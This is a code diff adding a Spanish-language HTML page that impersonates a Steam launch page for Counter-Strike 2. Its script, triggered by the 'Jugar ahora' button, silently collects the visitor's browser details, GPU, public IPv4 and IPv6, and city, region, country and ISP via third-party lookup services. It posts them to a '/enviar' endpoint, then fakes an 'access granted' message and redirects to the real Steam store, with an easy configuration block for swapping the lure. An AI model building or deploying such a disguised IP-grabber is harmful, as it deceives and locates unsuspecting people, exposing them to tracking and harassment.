@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Steam - Acceso al Juego</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+  <div class="steam-container">
+    <div class="steam-header">
+      <img src="https://store.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" alt="Steam" class="steam-logo">
+    </div>
+
+    <div class="game-card">
+      <img id="game-image" src="https://cdn.cloudflare.steamstatic.com/steam/apps/730/header.jpg" alt="Juego" class="game-banner">
+      
+      <div class="game-info">
+        <h1 id="game-name">Counter-Strike 2</h1>
+        <p id="game-desc">Haz clic para continuar e iniciar el juego.</p>
+        
+        <button id="playBtn" class="steam-btn">Jugar ahora</button>
+      </div>
+    </div>
+
+    <div id="status"></div>
+  </div>
+
+  <script>
+    // ====================== CONFIGURACIÓN FÁCIL ======================
+    const REDIRECT_URL = "https://store.steampowered.com/app/730/CounterStrike_2/";  // ← Cambia esto
+    const GAME_NAME = "Counter-Strike 2";                                             // ← Nombre del juego
+    const GAME_IMAGE = "https://cdn.cloudflare.steamstatic.com/steam/apps/730/header.jpg"; // ← Imagen
+    const GAME_DESC = "Haz clic para continuar e iniciar el juego.";                  // ← Descripción
+    // =================================================================
+
+    document.getElementById("game-name").textContent = GAME_NAME;
+    document.getElementById("game-image").src = GAME_IMAGE;
+    document.getElementById("game-desc").textContent = GAME_DESC;
+
+    document.getElementById('playBtn').addEventListener('click', async () => {
+      const btn = document.getElementById('playBtn');
+      const status = document.getElementById('status');
+      
+      btn.disabled = true;
+      btn.textContent = "Cargando...";
+      status.textContent = "Obteniendo información...";
+
+      const data = {
+        user_agent: navigator.userAgent,
+        sistema: navigator.platform || "Desconocido",
+        hostname: window.location.hostname || "N/A",
+        navegador: detectarNavegador(),
+        gpu: detectarGPU(),
+        ipv4: "N/A",
+        ipv6: "N/A"
+      };
+
+      // Intentar obtener IPv4 e IPv6 + ubicación
+      try {
+        // IPv4
+        const ipv4Res = await fetch('https://api.ipify.org?format=json');
+        const ipv4Data = await ipv4Res.json();
+        data.ipv4 = ipv4Data.ip;
+
+        // IPv6 (si está disponible)
+        try {
+          const ipv6Res = await fetch('https://api64.ipify.org?format=json');
+          const ipv6Data = await ipv6Res.json();
+          data.ipv6 = ipv6Data.ip;
+        } catch (e) {
+          data.ipv6 = "No disponible";
+        }
+
+        // Ubicación e ISP
+        const locRes = await fetch(`https://ipapi.co/${data.ipv4}/json/`);
+        const loc = await locRes.json();
+        
+        data.region = loc.region || loc.region_code || "N/A";
+        data.pais = loc.country_name || "N/A";
+        data.ciudad = loc.city || "N/A";
+        data.isp = loc.org || "N/A";
+      } catch (e) {
+        data.region = data.pais = data.ciudad = data.isp = "No disponible";
+      }
+
+      try {
+        await fetch('/enviar', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(data)
+        });
+
+        status.innerHTML = "✅ Acceso concedido. Redirigiendo...";
+        btn.textContent = "Iniciando...";
+        btn.style.background = "#5c7e10";
+
+        setTimeout(() => {
+          window.location.href = REDIRECT_URL;
+        }, 1500);
+
+      } catch (e) {
+        status.innerHTML = "❌ Error al procesar. Intenta de nuevo.";
+        btn.disabled = false;
+        btn.textContent = "Jugar ahora";
+      }
+    });
+
+    function detectarNavegador() {
+      const ua = navigator.userAgent;
+      if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
+      if (ua.includes("Firefox")) return "Firefox";
+      if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+      if (ua.includes("Edg")) return "Edge";
+      if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+      return "Otro";
+    }
+
+    function detectarGPU() {
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return "No disponible";
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+          return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "No detectada";
+        }
+        return "No detectada";
+      } catch (e) {
+        return "No detectada";
+      }
+    }
+  </script>
+</body>
+</html>
